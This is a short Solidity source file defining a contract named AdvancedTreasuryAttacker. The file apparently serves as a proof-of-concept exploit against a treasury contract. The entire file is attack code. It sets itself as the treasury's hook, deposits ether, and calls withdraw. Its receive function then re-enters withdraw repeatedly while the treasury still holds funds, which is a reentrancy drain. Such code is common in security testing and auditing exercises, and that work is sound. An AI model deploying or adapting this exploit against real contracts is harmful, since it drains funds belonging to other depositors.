// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IAdvancedTreasury {
    function deposit() external payable;
    function withdraw() external;
    function setHook(address newHook) external;
}

contract AdvancedTreasuryAttacker {
    IAdvancedTreasury public immutable treasury;
    uint256 public depositAmount;

    constructor(address treasuryAddress) {
        require(treasuryAddress != address(0), "AdvancedTreasuryAttacker: zero treasury");
        treasury = IAdvancedTreasury(treasuryAddress);
    }

    function attack() external payable {
        require(msg.value > 0, "AdvancedTreasuryAttacker: zero deposit");
        depositAmount = msg.value;
        treasury.setHook(address(this));
        treasury.deposit{ value: msg.value }();
        treasury.withdraw();
    }

    receive() external payable {
        if (address(treasury).balance >= depositAmount) {
            treasury.withdraw();
        }
    }
}
